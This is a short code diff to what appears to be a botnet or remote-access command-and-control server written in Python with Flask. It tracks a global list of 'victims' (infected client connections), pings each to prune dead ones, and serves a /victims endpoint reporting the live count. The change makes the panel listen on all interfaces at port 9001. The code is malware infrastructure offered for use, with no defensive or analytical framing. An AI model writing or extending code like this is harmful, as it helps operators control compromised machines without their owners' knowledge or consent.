@@ -10,11 +10,12 @@ victims = list()
 
 app = export_app()
 
+
 @app.route('/victims')
 def get_victims():
     global victims
     checked = list()
-    
+
     for client in victims:
         try:
             client.conn.send('CHECK'.encode('utf-8'))
@@ -25,10 +26,12 @@ def get_victims():
     victims = checked
 
     return jsonify({
-        'TOTAL SIZE' : len(victims)
+        'TOTAL SIZE': len(victims)
     })
 
-api = Thread(target=app.run, name="API Handler 1", daemon=True)
+
+api = Thread(target=app.run, name="API Handler 1", daemon=True,
+             kwargs={'host': '0.0.0.0', 'port': 9001})
 
 api.start()
 
